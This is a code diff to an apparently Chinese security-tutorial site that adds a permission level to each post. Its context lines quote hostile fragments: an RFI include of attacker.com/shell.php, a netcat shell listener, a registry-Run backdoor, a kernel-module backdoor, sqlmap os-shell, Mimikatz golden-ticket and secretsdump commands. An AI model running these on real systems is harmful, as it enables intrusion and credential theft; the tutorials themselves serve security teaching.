@@ -203,6 +203,7 @@ export const posts = [
     category: 'network',
     subcategory: 'dns',
     tags: ['网络', 'DNS', '基础'],
+    permission: 'login',
     summary: 'DNS 解析流程、记录类型、常见攻击和安全配置。',
     content: `
 ## 什么是 DNS
@@ -316,6 +317,7 @@ sudo systemd-resolve --statistics
     category: 'network',
     subcategory: 'wireshark',
     tags: ['网络', 'Wireshark', '流量分析'],
+    permission: 'login',
     summary: 'Wireshark 抓包工具的使用方法和过滤技巧。',
     content: `
 ## Wireshark 简介
@@ -452,6 +454,7 @@ tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_dat
     category: 'linux',
     subcategory: 'linux-commands',
     tags: ['Linux', '命令', '基础'],
+    permission: 'public',
     summary: '渗透测试和日常运维中最常用的 Linux 命令。',
     content: `
 ## 文件操作
@@ -597,6 +600,7 @@ sed -i 's/old/new/g' /path/to/*.conf
     category: 'linux',
     subcategory: 'linux-users',
     tags: ['Linux', '权限', '用户管理'],
+    permission: 'public',
     summary: 'Linux 用户管理、文件权限、sudo 配置和提权方法。',
     content: `
 ## 用户管理
@@ -741,6 +745,7 @@ passwd -S username        # 查看状态
     category: 'linux',
     subcategory: 'linux-process',
     tags: ['Linux', '进程', '服务'],
+    permission: 'public',
     summary: 'Linux 进程管理、服务配置和定时任务。',
     content: `
 ## 进程管理
@@ -881,6 +886,7 @@ systemctl reload nginx
     category: 'linux',
     subcategory: 'linux-network',
     tags: ['Linux', '网络', '配置'],
+    permission: 'public',
     summary: 'Linux 网络配置、防火墙、VPN 和流量管理。',
     content: `
 ## 网络配置
@@ -1034,6 +1040,7 @@ cat /etc/netplan/*.yaml
     category: 'attack-defense',
     subcategory: 'persistence',
     tags: ['渗透测试', '权限维持', '后门'],
+    permission: 'login',
     summary: '常见权限维持方法和后门技术。',
     content: `
 ## 权限维持方法
@@ -1313,6 +1320,7 @@ if __name__ == "__main__":
     category: 'attack-defense',
     subcategory: 'lateral',
     tags: ['渗透测试', '横向移动', '内网'],
+    permission: 'login',
     summary: '内网横向移动的常见方法和工具。',
     content: `
 ## 横向移动方法
@@ -1561,6 +1569,7 @@ if __name__ == "__main__":
     category: 'attack-defense',
     subcategory: 'anti-forensics',
     tags: ['渗透测试', '反溯源', '日志'],
+    permission: 'admin',
     summary: '渗透测试中的反溯源技术日志清理方法。',
     content: `
 ## 反溯源方法
@@ -1904,6 +1913,7 @@ if __name__ == "__main__":
     category: 'domain',
     subcategory: 'domain-recon',
     tags: ['域渗透', '信息收集', 'Active Directory'],
+    permission: 'login',
     summary: '域环境下的信息收集方法和工具。',
     content: `
 ## 基本信息
@@ -2262,6 +2272,7 @@ if __name__ == "__main__":
     category: 'domain',
     subcategory: 'domain-attack',
     tags: ['域渗透', '域控', 'Active Directory'],
+    permission: 'admin',
     summary: '获取域控制器权限的常见方法。',
     content: `
 ## 域控攻击方法
@@ -2552,6 +2563,7 @@ if alerts:
     category: 'domain',
     subcategory: 'domain-techniques',
     tags: ['域渗透', 'Kerberos', 'NTLM'],
+    permission: 'admin',
     summary: '域渗透中的常见攻击技术和利用方法。',
     content: `
 ## Kerberos 攻击
@@ -2809,6 +2821,7 @@ for alert in alerts:
     category: 'ir',
     subcategory: 'ir-linux',
     tags: ['应急响应', 'Linux', '安全'],
+    permission: 'login',
     summary: 'Linux 系统安全事件应急响应流程。',
     content: `
 ## 排查步骤
@@ -3309,6 +3322,7 @@ if __name__ == "__main__":
     category: 'ir',
     subcategory: 'ir-windows',
     tags: ['应急响应', 'Windows', '安全'],
+    permission: 'login',
     summary: 'Windows 系统安全事件应急响应流程。',
     content: `
 ## 排查步骤
@@ -3773,6 +3787,7 @@ if __name__ == "__main__":
     category: 'tools',
     subcategory: 'sqlmap',
     tags: ['工具', 'SQLmap', 'SQL注入'],
+    permission: 'login',
     summary: 'SQLmap 自动化 SQL 注入检测和利用工具。',
     content: `
 ## 基本用法
@@ -3855,6 +3870,7 @@ sqlmap -u "http://target/?id=1" --dbms=mysql
     category: 'tools',
     subcategory: 'nuclei',
     tags: ['工具', 'Nuclei', '漏洞扫描'],
+    permission: 'login',
     summary: 'Nuclei 基于模板的快速漏洞扫描器。',
     content: `
 ## 基本用法
@@ -3948,6 +3964,7 @@ requests:
     category: 'websec',
     subcategory: 'sqli',
     tags: ['Web安全', 'SQL注入', '注入'],
+    permission: 'login',
     summary: 'SQL 注入原理、类型、绕过技巧和防御方案。',
     content: `
 ## 什么是 SQL 注入
@@ -4094,6 +4111,7 @@ sqlmap -u "http://target/?id=1" --os-shell --batch
     category: 'websec',
     subcategory: 'xss',
     tags: ['Web安全', 'XSS', '跨站脚本'],
+    permission: 'login',
     summary: 'XSS 漏洞原理、类型、绕过技巧和防御方案。',
     content: `
 ## 什么是 XSS
@@ -4237,6 +4255,7 @@ python xsstrike.py -u "http://target.com/comment" --data "comment=test"
     category: 'websec',
     subcategory: 'upload',
     tags: ['Web安全', '文件上传', 'Webshell'],
+    permission: 'login',
     summary: '文件上传漏洞原理、绕过技巧和防御方案。',
     content: `
 ## 什么是文件上传漏洞
@@ -4372,6 +4391,7 @@ python upload_bypass.py -u http://target.com/upload -f shell.php
     category: 'websec',
     subcategory: 'rce',
     tags: ['Web安全', 'RCE', '命令执行'],
+    permission: 'login',
     summary: '远程代码执行漏洞原理、利用方式和防御方案。',
     content: `
 ## 什么是 RCE
@@ -4506,6 +4526,7 @@ python commix.py --url="http://target.com/vuln.php?cmd=whoami" --os-cmd
     category: 'websec',
     subcategory: 'csrf',
     tags: ['Web安全', 'CSRF', '请求伪造'],
+    permission: 'login',
     summary: 'CSRF 漏洞原理、攻击方式和防御方案。',
     content: `
 ## 什么是 CSRF
@@ -4638,6 +4659,7 @@ else:
     category: 'websec',
     subcategory: 'xxe',
     tags: ['Web安全', 'XXE', 'XML注入'],
+    permission: 'login',
     summary: 'XXE 漏洞原理、利用方式和防御方案。',
     content: `
 ## 什么是 XXE
@@ -4784,6 +4806,7 @@ xxe-inject -u http://target.com/api/xml -d "name=test" -s http://internal-host/
     category: 'websec-advanced',
     subcategory: 'deserialization',
     tags: ['Web安全', '反序列化', 'Java', 'PHP'],
+    permission: 'login',
     summary: '各语言反序列化漏洞原理和利用方法。',
     content: `
 ## 什么是反序列化漏洞
@@ -4984,6 +5007,7 @@ print(base64.b64encode(payload).decode())
     category: 'websec-advanced',
     subcategory: 'ssrf',
     tags: ['Web安全', 'SSRF', '内网'],
+    permission: 'login',
     summary: 'SSRF 漏洞原理、利用方式和防御方案。',
     content: `
 ## 什么是 SSRF
@@ -5167,6 +5191,7 @@ with ThreadPoolExecutor(max_workers=20) as executor:
     category: 'websec-advanced',
     subcategory: 'logic-vuln',
     tags: ['Web安全', '逻辑漏洞', '业务安全'],
+    permission: 'login',
     summary: '常见业务逻辑漏洞类型和挖掘方法。',
     content: `
 ## 什么是逻辑漏洞
@@ -5381,6 +5406,7 @@ done | grep -v "403|404"
     category: 'websec-advanced',
     subcategory: 'api-security',
     tags: ['Web安全', 'API', 'REST', 'GraphQL'],
+    permission: 'login',
     summary: 'API 接口安全测试方法和常见漏洞。',
     content: `
 ## API 安全风险
@@ -5621,6 +5647,7 @@ curl --http2 "https://api.target.com/v1/admin"
     category: 'websec-advanced',
     subcategory: 'wasm',
     tags: ['Web安全', 'WASM', '逆向'],
+    permission: 'login',
     summary: 'WebAssembly 逆向分析基础。',
     content: `
 ## 什么是 WebAssembly
@@ -5788,6 +5815,7 @@ exports.check_memory_valid = function(addr, len) {
     category: 'mobile',
     subcategory: 'android-reverse',
     tags: ['移动端安全', 'Android', '逆向'],
+    permission: 'login',
     summary: 'Android APK 逆向分析基础。',
     content: `
 ## Android 逆向工具
@@ -5901,6 +5929,7 @@ jarsigner -keystore keystore.apk target.apk alias
     category: 'mobile',
     subcategory: 'android-pentest',
     tags: ['移动端安全', 'Android', '渗透测试'],
+    permission: 'login',
     summary: 'Android 应用安全测试方法。',
     content: `
 ## 测试环境搭建
@@ -6015,6 +6044,7 @@ Java.perform(function() {
     category: 'mobile',
     subcategory: 'ios-reverse',
     tags: ['移动端安全', 'iOS', '逆向'],
+    permission: 'login',
     summary: 'iOS 应用逆向分析基础。',
     content: `
 ## iOS 逆向工具
@@ -6141,6 +6171,7 @@ keychain-dumper -a
     category: 'mobile',
     subcategory: 'miniapp-pentest',
     tags: ['移动端安全', '小程序', '渗透测试'],
+    permission: 'login',
     summary: '微信小程序安全测试方法。',
     content: `
 ## 小程序结构
@@ -6242,6 +6273,7 @@ wx.setStorageSync('token', token);
     category: 'cloud',
     subcategory: 'aws-security',
     tags: ['云安全', 'AWS', '配置'],
+    permission: 'login',
     summary: 'AWS 云环境安全配置最佳实践。',
     content: `
 ## IAM 安全
@@ -6327,6 +6359,7 @@ aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,Attribut
     category: 'cloud',
     subcategory: 'docker-security',
     tags: ['云安全', 'Docker', '容器'],
+    permission: 'login',
     summary: 'Docker 容器安全配置和加固。',
     content: `
 ## 镜像安全
@@ -6417,6 +6450,7 @@ docker run -it --net host --pid host docker/docker-bench-security
     category: 'cloud',
     subcategory: 'k8s-security',
     tags: ['云安全', 'Kubernetes', 'K8s'],
+    permission: 'login',
     summary: 'Kubernetes 集群安全配置。',
     content: `
 ## RBAC 权限控制
@@ -6505,6 +6539,7 @@ trivy image nginx:latest
     category: 'crypto',
     subcategory: 'crypto-basic',
     tags: ['密码学', '基础', 'CTF'],
+    permission: 'login',
     summary: '密码学基本概念和常见加密方式。',
     content: `
 ## 密码学分类
@@ -6567,6 +6602,7 @@ XXencode
     category: 'crypto',
     subcategory: 'hash-crack',
     tags: ['密码学', '哈希', '破解'],
+    permission: 'login',
     summary: '常见哈希算法和破解方法。',
     content: `
 ## 常见哈希算法
@@ -6637,6 +6673,7 @@ john --wordlist=passwords.txt hash.txt
     category: 'crypto',
     subcategory: 'symmetric-crypto',
     tags: ['密码学', '对称加密', 'AES', 'DES'],
+    permission: 'login',
     summary: '常见对称加密算法和攻击方法。',
     content: `
 ## 常见算法
@@ -6709,6 +6746,7 @@ plaintext = cipher.decrypt(ciphertext)
     category: 'crypto',
     subcategory: 'asymmetric-crypto',
     tags: ['密码学', 'RSA', '非对称加密'],
+    permission: 'login',
     summary: 'RSA 等非对称加密算法原理和攻击方法。',
     content: `
 ## RSA 算法
@@ -6780,6 +6818,7 @@ plaintext = cipher.decrypt(ciphertext)
     category: 're',
     subcategory: 're-basic',
     tags: ['逆向工程', '基础', 'CTF'],
+    permission: 'login',
     summary: '逆向工程基本概念和常用工具。',
     content: `
 ## 什么是逆向工程
@@ -6861,6 +6900,7 @@ xxd target | head        # 十六进制查看
     category: 're',
     subcategory: 'x86-asm',
     tags: ['逆向工程', '汇编', 'x86'],
+    permission: 'login',
     summary: 'x86 汇编语言基础指令和寄存器。',
     content: `
 ## 寄存器
@@ -6954,6 +6994,7 @@ ret               ; 返回
     category: 're',
     subcategory: 'ida-pro',
     tags: ['逆向工程', 'IDA', '工具'],
+    permission: 'login',
     summary: 'IDA Pro 反汇编工具使用指南。',
     content: `
 ## IDA Pro 简介
@@ -7029,6 +7070,7 @@ for func_ea in idautils.Functions():
     category: 're',
     subcategory: 'ghidra',
     tags: ['逆向工程', 'Ghidra', 'NSA'],
+    permission: 'login',
     summary: 'Ghidra 开源逆向工具使用指南。',
     content: `
 ## Ghidra 简介
@@ -7109,6 +7151,7 @@ public class MyScript extends GhidraScript {
     category: 'internal',
     subcategory: 'internal-recon',
     tags: ['内网渗透', '信息收集', '横向'],
+    permission: 'login',
     summary: '内网环境信息收集方法和工具。',
     content: `
 ## 本机信息
@@ -7195,6 +7238,7 @@ nmap -sV -p 80,443,445,3389 192.168.1.0/24
     category: 'internal',
     subcategory: 'proxy-tunnel',
     tags: ['内网渗透', '代理', '隧道'],
+    permission: 'login',
     summary: '内网穿透代理和隧道技术。',
     content: `
 ## 代理工具
@@ -7286,6 +7330,7 @@ iodine tunnel.domain.com
     category: 'internal',
     subcategory: 'internal-post',
     tags: ['内网渗透', '后渗透', '持久化'],
+    permission: 'login',
     summary: '获取初始访问后的后渗透技术。',
     content: `
 ## 信息收集
@@ -7374,6 +7419,7 @@ reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v backdoor /t
     category: 'internal',
     subcategory: 'apt',
     tags: ['APT', '高级威胁', '攻防'],
+    permission: 'login',
     summary: 'APT 攻击技术和常见手法。',
     content: `
 ## 什么是 APT
@@ -7445,6 +7491,7 @@ APT（Advanced Persistent Threat）高级持续性威胁，指有组织、有目
     category: 'securedev',
     subcategory: 'secure-coding',
     tags: ['安全开发', '编码规范', 'OWASP'],
+    permission: 'login',
     summary: '各语言安全编码最佳实践。',
     content: `
 ## 通用原则
@@ -7531,6 +7578,7 @@ check_password_hash(password_hash, input_password)
     category: 'securedev',
     subcategory: 'devsecops',
     tags: ['DevSecOps', 'CI/CD', '安全'],
+    permission: 'login',
     summary: 'DevSecOps 流程和工具集成。',
     content: `
 ## 什么是 DevSecOps
@@ -7599,6 +7647,7 @@ DevSecOps 是将安全集成到 DevOps 流程中的实践。
     category: 'securedev',
     subcategory: 'sast-dast',
     tags: ['安全测试', 'SAST', 'DAST'],
+    permission: 'login',
     summary: '静态和动态安全测试工具使用指南。',
     content: `
 ## SAST（静态应用安全测试）
@@ -7694,6 +7743,7 @@ nuclei -u http://target.com -t cves/
     category: 'redteam',
     subcategory: 'c2-framework',
     tags: ['红队', 'C2', '框架'],
+    permission: 'login',
     summary: '主流 C2 框架对比和实战配置。',
     content: `
 ## 什么是 C2
@@ -7795,6 +7845,7 @@ sliver> generate --cdn cloudfront.net --save ./beacon.exe
     category: 'redteam',
     subcategory: 'evasion',
     tags: ['红队', '免杀', '对抗'],
+    permission: 'login',
     summary: '绕过杀软检测的技术方法。',
     content: `
 ## 什么是免杀
@@ -7905,6 +7956,7 @@ vt scan file payload.exe
     category: 'redteam',
     subcategory: 'social-eng',
     tags: ['红队', '社会工程', '钓鱼'],
+    permission: 'login',
     summary: '社会工程学攻击技术和防御方法。',
     content: `
 ## 什么是社会工程学
@@ -8006,6 +8058,7 @@ Have I Been Pwned
     category: 'redteam',
     subcategory: 'webshell',
     tags: ['红队', 'Webshell', '后门'],
+    permission: 'login',
     summary: 'Webshell 加密、混淆和高级技术。',
     content: `
 ## 一句话木马
@@ -8141,6 +8194,7 @@ eval($a);
     category: 'vuln-analysis',
     subcategory: 'cve-analysis',
     tags: ['漏洞分析', 'CVE', '安全研究'],
+    permission: 'login',
     summary: 'CVE 漏洞分析和复现方法。',
     content: `
 ## 什么是 CVE
@@ -8238,6 +8292,7 @@ docker-compose up -d
     category: 'vuln-analysis',
     subcategory: 'heap-overflow',
     tags: ['漏洞利用', '堆溢出', 'PWN'],
+    permission: 'login',
     summary: '堆溢出漏洞原理和利用方法。',
     content: `
 ## 堆的基本概念
@@ -8324,6 +8379,7 @@ watch *(int*)0x12345678
     category: 'vuln-analysis',
     subcategory: 'rop',
     tags: ['漏洞利用', 'ROP', 'PWN'],
+    permission: 'login',
     summary: 'ROP 技术原理和利用方法。',
     content: `
 ## 什么是 ROP
@@ -8403,6 +8459,7 @@ payload += p64(system)
     category: 'vuln-analysis',
     subcategory: 'kernel-exploit',
     tags: ['漏洞利用', '内核', '提权'],
+    permission: 'login',
     summary: 'Linux 内核漏洞利用技术。',
     content: `
 ## 内核漏洞类型
@@ -8509,6 +8566,7 @@ p current->cred
     category: 'ctf',
     subcategory: 'ctf-web',
     tags: ['CTF', 'Web', '竞赛'],
+    permission: 'login',
     summary: 'CTF Web 方向常见题型和解题思路。',
     content: `
 ## 常见题型
@@ -8610,6 +8668,7 @@ gopher://127.0.0.1:6379/
     category: 'ctf',
     subcategory: 'ctf-pwn',
     tags: ['CTF', 'PWN', '二进制'],
+    permission: 'login',
     summary: 'CTF PWN 方向常见题型和解题思路。',
     content: `
 ## 常见题型
@@ -8697,6 +8756,7 @@ pwndbg> vis_heap_chunks
     category: 'ctf',
     subcategory: 'ctf-re',
     tags: ['CTF', '逆向', '竞赛'],
+    permission: 'login',
     summary: 'CTF 逆向方向常见题型和解题思路。',
     content: `
 ## 常见题型
@@ -8790,6 +8850,7 @@ simgr.explore(find=0x401234, avoid=0x401256)
     category: 'ctf',
     subcategory: 'ctf-crypto',
     tags: ['CTF', '密码学', '竞赛'],
+    permission: 'login',
     summary: 'CTF 密码学方向常见题型和解题思路。',
     content: `
 ## 常见题型
@@ -8878,6 +8939,7 @@ yafu "factor(n)"
     category: 'websec',
     subcategory: 'lfi',
     tags: ['Web安全', '文件包含', 'LFI', 'RFI'],
+    permission: 'login',
     summary: '本地文件包含和远程文件包含漏洞原理与利用。',
     content: `
 ## 什么是文件包含
@@ -8970,6 +9032,7 @@ POST: <?php include 'http://attacker.com/shell.php'; ?>
     category: 'websec',
     subcategory: 'session-hijack',
     tags: ['Web安全', '会话劫持', '会话固定', 'Cookie'],
+    permission: 'login',
     summary: '会话劫持和会话固定漏洞原理与防御。',
     content: `
 ## 会话机制
@@ -9038,6 +9101,7 @@ https://target.com/login?session=abc123
     category: 'attack-defense',
     subcategory: 'privesc',
     tags: ['渗透测试', '权限提升', 'Linux'],
+    permission: 'login',
     summary: 'Linux 环境下的常见提权方法和工具。',
     content: `
 ## 提权方法
@@ -9123,6 +9187,7 @@ getcap -r / 2>/dev/null
     category: 'tools',
     subcategory: 'fscan',
     tags: ['工具', 'Fscan', '内网扫描'],
+    permission: 'login',
     summary: 'Fscan 快速内网扫描和漏洞检测工具。',
     content: `
 ## Fscan 简介
@@ -9210,6 +9275,7 @@ fscan -h 10.10.1.100 -p 445 -c "whoami"
     category: 'mobile',
     subcategory: 'android-pentest',
     tags: ['移动端安全', 'APP渗透', 'Frida'],
+    permission: 'login',
     summary: 'APP 渗透测试完整流程：抓包、反编译、加固绕过。',
     content: `
 ## APK 敏感信息收集
@@ -9329,6 +9395,7 @@ Java.perform(function() {
     category: 'mobile',
     subcategory: 'miniapp-pentest',
     tags: ['移动端安全', '小程序渗透', '微信'],
+    permission: 'login',
     summary: '微信小程序渗透测试完整流程。',
     content: `
 ## PC 端小程序抓包
@@ -9422,6 +9489,7 @@ curl "https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid
     category: 'securedev',
     subcategory: 'devsecops',
     tags: ['DevOps', 'Git', 'Docker', '运维'],
+    permission: 'login',
     summary: 'Git 版本控制和 Docker 容器运维实用手册。',
     content: `
 ## Git 手册
@@ -9529,6 +9597,7 @@ services:
     category: 'linux',
     subcategory: 'linux-sources',
     tags: ['Linux', '换源', '软件源'],
+    permission: 'public',
     summary: 'CentOS、Ubuntu、Debian 系统更换软件源方法。',
     content: `
 ## 为什么换源
@@ -9664,6 +9733,7 @@ apt install vim
     category: 'linux',
     subcategory: 'linux-cron',
     tags: ['Linux', 'Crontab', '定时任务'],
+    permission: 'public',
     summary: 'crontab 格式、管理方法和日志查看。',
     content: `
 ## Crontab 格式
@@ -9809,6 +9879,7 @@ flock -n /tmp/script.lock /path/to/script.sh
     category: 'linux',
     subcategory: 'linux-boot',
     tags: ['Linux', '启动项', 'systemd'],
+    permission: 'public',
     summary: 'systemd 服务、rc.local 和自启脚本管理。',
     content: `
 ## Systemd 启动服务
@@ -9953,6 +10024,7 @@ journalctl -b
     category: 'linux',
     subcategory: 'linux-daemon',
     tags: ['Linux', '守护进程', 'systemd'],
+    permission: 'public',
     summary: 'systemd 守护进程管理和编写服务方法。',
     content: `
 ## 什么是守护进程
@@ -10090,6 +10162,7 @@ systemd-analyze blame | head -10
     category: 'attack-defense',
     subcategory: 'getshell',
     tags: ['渗透测试', 'Getshell', 'Webshell', '反弹Shell'],
+    permission: 'admin',
     summary: 'Webshell、反弹Shell 和一句话木马技术。',
     content: `
 ## Webshell
@@ -10206,6 +10279,7 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
     category: 'attack-defense',
     subcategory: 'privesc',
     tags: ['渗透测试', '数据库提权', 'MySQL', 'MSSQL'],
+    permission: 'admin',
     summary: 'MySQL、MSSQL、PostgreSQL 数据库提权方法。',
     content: `
 ## MySQL 提权
@@ -10319,6 +10393,7 @@ sa:password
     category: 'attack-defense',
     subcategory: 'persistence',
     tags: ['渗透测试', '权限维持', '隐藏后门'],
+    permission: 'admin',
     summary: '隐藏后门、无文件后门和内核模块后门技术。',
     content: `
 ## 隐藏后门
@@ -10464,6 +10539,7 @@ insmod backdoor.ko
     category: 'attack-defense',
     subcategory: 'lateral',
     tags: ['内网渗透', '隧道', '代理', '横向移动'],
+    permission: 'admin',
     summary: 'SSH 隧道、FRP、Chisel 和端口转发技术。',
     content: `
 ## SSH 隧道
@@ -10589,6 +10665,7 @@ nc -lvp 8080 -e /bin/sh
     category: 'attack-defense',
     subcategory: 'lateral',
     tags: ['内网渗透', '信息收集', 'fscan', '扫描'],
+    permission: 'admin',
     summary: 'fscan 扫描、存活探测和服务识别方法。',
     content: `
 ## fscan 扫描
@@ -10704,6 +10781,7 @@ net group "Domain Admins" /domain
     category: 'attack-defense',
     subcategory: 'lateral',
     tags: ['横向移动', 'IPC', 'SMB', 'Windows'],
+    permission: 'admin',
     summary: 'IPC$ 连接、文件传输和远程执行技术。',
     content: `
 ## IPC$ 连接
@@ -10816,6 +10894,7 @@ psexec \\\\192.168.1.100 -u admin -p pass cmd.exe
     category: 'domain',
     subcategory: 'domain-basic',
     tags: ['域渗透', 'LDAP', 'Kerberos', 'NTLM', 'SMB'],
+    permission: 'admin',
     summary: 'LDAP、Kerberos、NTLM、SMB、RPC 协议原理。',
     content: `
 ## LDAP 协议
@@ -10938,6 +11017,7 @@ rpcclient > queryuser admin
     category: 'domain',
     subcategory: 'domain-attack',
     tags: ['域渗透', '域控', 'DCSync', 'Golden Ticket'],
+    permission: 'admin',
     summary: 'DCSync、Kerberoasting、AS-REP Roasting 和 Golden Ticket。',
     content: `
 ## DCSync
@@ -11048,6 +11128,7 @@ klist
     category: 'domain',
     subcategory: 'domain-techniques',
     tags: ['域渗透', 'Pass the Hash', 'NTLM', 'Mimikatz'],
+    permission: 'admin',
     summary: 'PtH 原理、Mimikatz、Impacket 使用和防御方法。',
     content: `
 ## PtH 原理
@@ -11151,6 +11232,7 @@ secretsdump.py CORP/administrator@192.168.1.1 -hashes aad3b435...:f1f4d... -just
     category: 'domain',
     subcategory: 'domain-techniques',
     tags: ['域渗透', 'Pass the Ticket', 'Kerberos', 'Golden Ticket'],
+    permission: 'admin',
     summary: 'PtT 原理、Kerberos 票据和 Golden/Silver Ticket。',
     content: `
 ## PtT 原理
@@ -11266,6 +11348,7 @@ mimikatz.exe "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... 
     category: 'domain',
     subcategory: 'domain-techniques',
     tags: ['域渗透', 'NTLM Relay', 'Responder', 'SMB Relay'],
+    permission: 'admin',
     summary: 'NTLM Relay 原理、Responder、ntlmrelayx 和 SMB Relay。',
     content: `
 ## NTLM Relay 原理
@@ -11391,6 +11474,7 @@ crackmapexec smb 192.168.1.0/24 --gen-relay-list relays.txt
     category: 'domain',
     subcategory: 'domain-techniques',
     tags: ['域渗透', '委派', '非约束委派', '约束委派', 'RBCD'],
+    permission: 'admin',
     summary: '非约束委派、约束委派和 RBCD 攻击技术。',
     content: `
 ## 委派类型
